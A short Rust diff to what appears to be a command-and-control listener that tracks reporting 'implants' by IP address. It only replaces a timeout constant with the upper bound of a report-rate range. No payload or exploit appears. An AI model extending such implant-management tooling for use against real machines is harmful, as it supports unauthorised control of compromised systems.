@@ -5,7 +5,7 @@ use std::{
     time::Instant,
 };
 
-use common::{IMPLANT_TIMEOUT_SECONDS, Packet, SystemInfo, decode};
+use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, decode};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let listener = TcpListener::bind("0.0.0.0:9120")?;
@@ -47,7 +47,7 @@ fn remove_old_implants(implants: &mut HashMap<IpAddr, Implant>) -> HashMap<IpAdd
     implants
         .iter()
         .filter(|(_ip, implant)| {
-            now.duration_since(implant.last_report).as_secs() < IMPLANT_TIMEOUT_SECONDS
+            now.duration_since(implant.last_report).as_secs() < IMPLANT_REPORT_RATE_SECONDS.end
         })
         .map(|(ip, implant)| (*ip, implant.clone()))
         .collect()
